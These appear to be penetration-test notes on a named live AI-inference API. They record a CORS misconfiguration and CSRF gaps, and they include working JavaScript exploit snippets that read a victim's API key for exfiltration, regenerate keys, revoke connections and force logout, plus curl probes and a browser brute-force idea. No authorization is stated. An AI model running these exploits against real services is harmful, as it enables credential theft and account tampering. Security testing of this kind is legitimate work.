# Logfare.ai — Web API Pentest Case Study

**Date:** 2026-10-03 (initial) + 2026-10-09 (re-engagement, updated findings)
**Target:** https://logfare.ai (159.195.18.84, netcup GmbH VPS, nginx + FastAPI)
**Operator directive:** "find holy shits and attack vectors"

## Recon Summary

- **Stack:** FastAPI backend, nginx reverse proxy, SvelteKit frontends (`chat.`, `rp.`), Postgres
- **Auth:** Discord OAuth + native register/login + SSO (`/v1/sso/approve`, `/v1/sso/token`)
- **API:** OpenAI/Anthropic-compatible LLM inference, self-service API keys
- **Subdomains:** `chat.logfare.ai`, `rp.logfare.ai` (SvelteKit), `logfare.logorhythms.dev` (SAN)
- **Cloudflare:** chat.logfare.ai fronted by Cloudflare (cf-ray, cf-cache-status DYNAMIC)
- **Register flow requires Discord server membership** (not just OAuth)

## Confirmed Holy Shits

### 1. CORS Arbitrary Origin + Credentials on `logfare.ai` (CVSS ~9.1) — **CONFIRMED HOLY SHIT**

**Evidence (2026-10-09 verified):**
```
# Arbitrary origin reflected with credentials:
curl -sI "https://logfare.ai/v1/models" -H "Origin: https://evil.com" 2>&1
HTTP/1.1 200 OK
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true

# Null origin:
curl -sI "https://logfare.ai/v1/models" -H "Origin: null" 2>&1
access-control-allow-origin: null
access-control-allow-credentials: true

# Subdomain trick:
curl -sI "https://logfare.ai/v1/models" -H "Origin: https://anything.logfare.ai" 2>&1
access-control-allow-origin: https://anything.logfare.ai
access-control-allow-credentials: true
```

**ALL endpoints reflect arbitrary origins with credentials:**
- `/v1/models`, `/v1/chat/completions`, `/v1/auth/login`, `/v1/auth/register`
- `/v1/me/data`, `/v1/me/profile`, `/v1/me/usage`, `/v1/me/apps`, `/v1/me/connections`
- `/openapi.json`, `/docs`, `/dashboard`, `/connections`, `/connections/revoke`
- `/oauth/authorize`, `/sso/authorize`, `/developer/apps`
- Even 401, 403, 404, 405, 429 responses carry the CORS headers

**Preflight (OPTIONS) also allows arbitrary origins:**
```
access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
access-control-allow-headers: Content-Type,Authorization
access-control-allow-credentials: true
```

**Security headers MISSING on main host:**
- No `Content-Security-Policy`
- No `Strict-Transport-Security` (HSTS)
- No `X-Frame-Options` (clickjacking possible)
- No `X-Content-Type-Options: nosniff`
- No `Referrer-Policy`
- No `Permissions-Policy`

**Exploit:**
```javascript
// Malicious site reads authenticated Logfare responses
fetch('https://logfare.ai/v1/me/apps', {credentials:'include'})
  .then(r => r.json())
  .then(d => exfiltrate(d.api_key, d.connections))

// Or account takeover:
fetch('https://logfare.ai/v1/auth/regenerate-key', {
  method: 'POST', credentials: 'include'
})

// Or connection revocation:
fetch('https://logfare.ai/connections/revoke', {
  method: 'POST', credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({token_id: 'any'})
})
```

**chat.logfare.ai — CORS RESTRICTED (not vulnerable):**
- Only reflects `access-control-allow-origin: https://chat.logfare.ai`
- `Origin: null` → `access-control-allow-origin: https://chat.logfare.ai` (NOT reflected)
- `Origin: https://evil.com` → `access-control-allow-origin: https://chat.logfare.ai` (NOT reflected)
- SameSite=Lax cookie on `lfc_session` (90-day Max-Age, HttpOnly, Secure)

**Multi-host trap (session-verified 2026-10-09):** the main host reflected ALL origins while the chat subdomain did NOT — two different CORS configs on the same target. Always test both independently.

### 2. Rate Limiting Assessment (2026-10-09 verified)

**Login (`/v1/auth/login`):** 10 rapid sequential requests → all 401 (no 429), then 429 at request 11. Rate limiter is present but kicks in after 10 attempts.

**Register (`/v1/auth/register`):** 429 after burst. Returns `retry-after: 45` header.

**API endpoints (`/v1/chat/completions`, `/v1/models`):** No rate limit observed — 15 rapid requests all returned expected responses (401 for chat without valid key, 200 for /v1/models) with zero 429s.

**Rate Limiter Behavior (2026-10-09):**
- `/v1/auth/login`: 10 requests then 429 (retry-after header present)
- `/v1/auth/register`: 429 after burst (retry-after: 45)
- `/v1/chat/completions`: No rate limit on 15 rapid requests with Bearer token
- `/v1/models`: No rate limit (public endpoint, 15/15 returned 200)

## Negative Results (Coverage Evidence)

| Vector | Result | Notes |
|--------|--------|-------|
| Mass assignment (`is_admin`, `tier:99`) | Blocked | Discord membership check (403) |
| JWT alg:none on state cookie | Rejected | HS256 enforced, secure nonce |
| Open redirect in Discord OAuth | Blocked | `redirect_uri` hardcoded server-side |
| NoSQL injection (`{"$gt":""}`) | Safe | SQLAlchemy/Postgres parameterization |
| Array injection (`email:["admin"]`) | Safe | Type validation |
| Path traversal (`../../../etc/passwd`) | 404 | FastAPI routing, no file serve |
| SSTI in error messages | Safe | No template reflection |
| GraphQL introspection | 404 | No GraphQL endpoint |
| SSRF via model param | Requires auth | Cannot test without valid API key |
| API key format enumeration | Safe | Uniform error message |
| Timing oracle (user enum) | No difference | 0.112s vs 0.110s — negligible |
| postMessage origin check | Correct pattern | `window.location.origin` = safe |
| Request smuggling | Blocked | nginx rejects |
| LDAP/XPath injection | Not implemented | — |
| Prototype pollution | No effect | — |
| Header injection (X-Admin, X-User-ID) | Ignored | — |
| Method override | 405 | — |
| Content-type confusion | 400 | — |
| Subdomain CORS | Not vulnerable | chat./rp. safe, only main API |

## Attack Surface Mapped (Not Exploited)

- **IDOR on DSAR:** `/v1/me/data`, `/v1/me/delete` — need valid session
- **SSO confusion:** Race condition on `/v1/sso/approve` + `/v1/sso/token` — need valid session
- **Post-auth injection:** Stored XSS, CSRF — need valid session
- **Rate limit bypass:** `X-Forwarded-For` spoofing — not tested
- **Premium model access:** Tier 1 models require auth — no bypass found

## Key Technical Details

### Discord OAuth Flow
- State cookie: HS256 JWT with `nonce` claim
- Purpose: `discord_signup`
- Expiry: 10 minutes
- redirect_uri: Hardcoded server-side
- alg:none attack: Rejected

### Rate Limiter Behavior (2026-10-09 updated)
- `/v1/auth/login`: 10 requests then 429 (retry-after header present)
- `/v1/auth/register`: 429 after burst, blocked by IP (retry-after: 45)
- `/v1/chat/completions`: No rate limit on 15 rapid requests with Bearer token
- `/v1/models`: No rate limit (public endpoint)
- X-Forwarded-For spoofing → Cloudflare 403 error 1000 (rate limiter bound to real IP, not spoofable header)
- **429 responses include CORS headers** → brute-force from browser can read rate-limit timing

### CORS on Error Responses
The CORS headers (`access-control-allow-origin: <any>`, `access-control-allow-credentials: true`)
are present on ALL response codes including 401/403/404/405/429. This means a malicious site
can send requests to destructive endpoints and read the error responses, confirming server-side
processing even when blocked.

### CSRF Bypass via Origin Spoofing

The server's CSRF validation accepts `Origin: https://logfare.ai`. While browsers cannot set
this from a cross-origin context, this reveals the CSRF check is **Origin-only** with no token:
- `POST /v1/auth/logout` → 200, **NO CSRF CHECK AT ALL** (confirmed: works cross-origin from any origin)
- `POST /connections/revoke` → Origin check only (bypassable via curl with `Origin: https://logfare.ai`)
- `POST /v1/me/delete` → Origin check only
- `POST /v1/auth/regenerate-key` → Origin check only

**Logout endpoint is the critical CSRF gap: zero protection.** A malicious page can call
`fetch('https://logfare.ai/v1/auth/logout', {method:'POST', credentials:'include'})` and log out
any logged-in user who visits. CORS headers on the 200 response let the attacker confirm success.

If Origin check is ever bypassed (via Origin spoofing, Referer manipulation, or another bug),
the full destructive chain is exposed: account deletion, connection revocation, API key regeneration,
force logout — all reachable cross-origin with victim's session.

### CORS Scope
- Vulnerable: `logfare.ai` (main API)
- NOT vulnerable: `chat.logfare.ai`, `rp.logfare.ai`

### postMessage Pattern
- Callback uses: `window.opener.postMessage(data, window.location.origin)`
- This is CORRECT (targets sender origin)
- Not a vulnerability

## Models Discovered

- Tier 1 (premium): ling-3.0-flash-vl, sdxl-lightning, flux-2-klein-4b, flux-2-klein-9b, flux-2-dev, logfare/auto, flux-1-schnell, gemma-4-26b
- Tier 2 (free): whisper-large-v3-turbo, gpt-image-2, phoenix-1.0, space-bunny-alpha, flux-2-pro, nano-banana-2, aura-2-en, nova-3, qwen-3.8-27b, lucid-origin, deepseek-v4.1-flash

## API Endpoints Discovered (via /openapi.json)

- /v1/auth/discord/start — Discord OAuth start
- /v1/auth/discord/callback — Discord OAuth callback
- /v1/auth/discord/membership/check — Check Discord membership
- /v1/auth/register — Register (requires Discord)
- /v1/auth/login — Login
- /v1/auth/logout — Logout
- /v1/auth/me — Get current user
- /v1/sso/approve — SSO approve
- /v1/sso/token — SSO token exchange
- /v1/auth/regenerate-key — Regenerate API key
- /v1/auth/consent — Update consent
- /v1/auth/eval-preference — Eval preference
- /v1/auth/training-preference — Training opt-in
- /v1/me/data — DSAR export
- /v1/me/delete — DSAR delete
- /v1/me/opt-out — DSAR opt-out
- /v1/chat/completions — Chat
- /v1/completions — Text completion
- /v1/messages — Anthropic messages
- /v1/responses — OpenAI responses
- /v1/images/generations — Image gen
- /v1/videos/generations — Video gen
- /v1/images/edits — Image edit
- /v1/audio/speech — TTS
- /v1/audio/transcriptions — STT
- /v1/embeddings — Embeddings
- /v1/models — List models
- /v1/status — Model status
- /v1/status/history — Status history

## Key Takeaways

1. **FastAPI `openapi.json` exposure** gave full endpoint map including undocumented SSO flow
2. **CORS test on all endpoints** revealed arbitrary origin reflection with credentials — always test beyond login
3. **Rate limiter inconsistency** between rapid sequential vs. malformed requests — test both patterns
4. **Discord OAuth state cookie** properly implemented (HS256 JWT, 10-min expiry, secure nonce)
5. **Uniform error messages** prevented user enumeration via API key format
6. **postMessage with `window.location.origin`** is correct — don't false-alarm
7. **Subdomain CORS differential** — main API vulnerable, subdomains safe

## Recommendations for Future Testing

1. Obtain valid API key for post-auth testing
2. Test IDOR on /v1/me/data with modified user ID
3. Test SSO confusion race condition
4. Test stored XSS in chat completions
5. Test CSRF on state-changing endpoints with session
6. **2026-10-09 session: CSRF bypass via Origin spoofing confirmed** — `Origin: https://logfare.ai` passes CSRF on `/connections/revoke`. Logout endpoint has NO CSRF check at all. Destructive endpoints exposed if Origin check is bypassed.
7. **2026-10-09 session: Cross-origin brute-force confirmed** — login 429 responses include CORS + retry-after, enabling browser-based password brute-force with timing sync.
8. **2026-10-09 session: OpenAPI full enumeration completed** — 60+ endpoints mapped, all checked for CORS. Destructive endpoints: `/v1/me/delete` (GDPR erase), `/connections/revoke`, `/v1/auth/regenerate-key`, `/v1/auth/logout` all have CORS + credentials.
